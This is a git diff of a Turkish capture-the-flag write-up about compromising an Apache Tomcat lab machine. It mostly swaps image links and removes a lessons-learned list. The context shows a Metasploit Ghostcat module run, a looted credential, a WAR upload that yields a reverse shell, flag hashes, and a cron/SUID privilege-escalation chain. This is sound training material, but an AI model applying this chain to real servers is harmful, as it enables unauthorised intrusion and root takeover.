@@ -39,6 +39,7 @@ use auxiliary/admin/http/tomcat_ghostcat
 set RHOSTS 10.112.189.252
 run
 ```
+<img width="1136" height="636" alt="image" src="https://github.com/user-attachments/assets/6701efd4-a2d9-44c5-b849-c0857534c690" />
 
 Modül başarılı şekilde çalıştı ve aşağıdaki dizine bir dosya kaydetti.
 
@@ -55,8 +56,6 @@ cat /root/.msf4/loot/*.txt
 ```text
 skyfuck:8730281lkjlkjdqlksalks
 ```
-
-
 
 ---
 
@@ -128,7 +127,7 @@ Ardından oluşturduğum `shell.war` dosyasını Tomcat Manager üzerinden uploa
 
 Uygulamayı çalıştırdığım anda reverse shell bağlantısı geldi.
 
-![Reverse Shell](images/reverse-shell.png)
+<img width="1043" height="617" alt="shell" src="https://github.com/user-attachments/assets/b3b4bfa9-c789-45af-8d36-ecc0c0d827c6" />
 
 ---
 
@@ -165,6 +164,7 @@ cat user.txt
 ```text
 39400c90bc683a41a8935e4719f181bf
 ```
+<img width="1020" height="469" alt="flag1" src="https://github.com/user-attachments/assets/df9c0b37-1ee4-40ff-8346-0729ca3d6244" />
 
 ---
 
@@ -255,30 +255,6 @@ cat root.txt
 ```text
 d89d5391984c0450a95497153ae7ca3a
 ```
-
-![Root](images/root.png)
+<img width="469" height="154" alt="flagroot" src="https://github.com/user-attachments/assets/e2bee858-44f5-49c5-a3a7-e988daeb0c74" />
 
 ---
-
-# Lessons Learned
-
-Bu makinede zincir şu şekilde ilerledi:
-
-1. Nmap ile AJP (8009) servisinin keşfi.
-2. Ghostcat (CVE-2020-1938) kullanılarak credential elde edilmesi.
-3. Tomcat Manager paneline erişim.
-4. WAR dosyası yüklenerek initial shell alınması.
-5. TTY upgrade.
-6. World-writable ve root tarafından çalıştırılan cron scriptinin tespit edilmesi.
-7. SUID bash oluşturularak root yetkisinin elde edilmesi.
-
-Bu oda, özellikle aşağıdaki konular üzerinde pratik yapmak için oldukça faydalıydı:
-
-- Apache Tomcat Enumeration
-- Ghostcat (CVE-2020-1938)
-- Tomcat Manager Abuse
-- WAR Deployment
-- Reverse Shell
-- Linux TTY Upgrade
-- Cron Job Privilege Escalation
-- SUID Exploitation
